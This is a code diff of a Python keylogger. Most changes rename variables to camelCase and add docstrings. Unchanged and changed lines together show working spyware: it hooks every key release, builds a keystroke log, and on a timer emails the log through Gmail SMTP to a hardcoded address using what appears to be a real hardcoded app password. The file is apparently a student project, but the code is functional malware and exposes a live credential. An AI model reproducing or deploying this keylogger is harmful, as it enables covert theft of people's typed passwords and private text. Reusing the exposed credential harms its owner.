@@ -11,16 +11,16 @@ EMAIL_ADDRESS = "shailygup.bcit8045@gmail.com"
 EMAIL_PASSWORD = "repolqohydhlcxkg" # Temp app password
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, reportMethod="email"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
-        self.report_method = report_method
+        self.reportMethod = reportMethod
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
         self.log = ""
         # record start & end datetimes
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+        self.startDt = datetime.now()
+        self.endDt = datetime.now()
 
     def callback(self, event):
         """
@@ -47,14 +47,18 @@ class Keylogger:
         self.log += name
     
     def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+        """
+        This method constructs the filename to be identified by start & end datetimes
+        """
+        startDtStr = str(self.startDt)[:-7].replace(" ", "-").replace(":", "")
+        endDtStr = str(self.endDt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{startDtStr}_{endDtStr}"
 
     def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
+        """
+        This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable
+        """
         # open the file in write mode (create it)
         with open(f"{self.filename}.txt", "w") as f:
             # write the keylogs to the file
@@ -73,14 +77,17 @@ class Keylogger:
         msg["Subject"] = "Keylogger logs"
         # simple paragraph, feel free to edit
         html = f"<p>{message}</p>"
-        text_part = MIMEText(message, "plain")
-        html_part = MIMEText(html, "html")
-        msg.attach(text_part)
-        msg.attach(html_part)
+        textPart = MIMEText(message, "plain")
+        htmlPart = MIMEText(html, "html")
+        msg.attach(textPart)
+        msg.attach(htmlPart)
         # after making the mail, convert back as string message
         return msg.as_string()
 
     def sendmail(self, email, password, message, verbose=1):
+        """
+        This method sends an email with the keylogger file.
+        """
         # manages a connection to an SMTP server
         # https://support.google.com/a/answer/176600?hl=en
         server = smtplib.SMTP_SSL(host="smtp.gmail.com")
@@ -102,16 +109,16 @@ class Keylogger:
         """
         if self.log:
             # if there is something in log, report it
-            self.end_dt = datetime.now()
+            self.endDt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            if self.report_method == "email":
+            if self.reportMethod == "email":
                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
+            elif self.reportMethod == "file":
                 self.report_to_file()
             # if you don't want to print in the console, comment below line
             print(f"[{self.filename}] - {self.log}")
-            self.start_dt = datetime.now()
+            self.startDt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
@@ -120,21 +127,15 @@ class Keylogger:
         timer.start()
     
     def start(self):
-        # record the start datetime
-        self.start_dt = datetime.now()
-        # start the keylogger
+        """
+        This method will start the keylogger.
+        """
+        self.startDt = datetime.now()
         keyboard.on_release(callback=self.callback)
-        # start reporting the keylogs
         self.report()
-        # make a simple message
         print(f"{datetime.now()} - Started keylogger")
-        # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
     
 if __name__ == "__main__":
-    # if you want a keylogger to send to your email
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
-    # (and then send it using your favorite method)
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, reportMethod="email")
     keylogger.start()
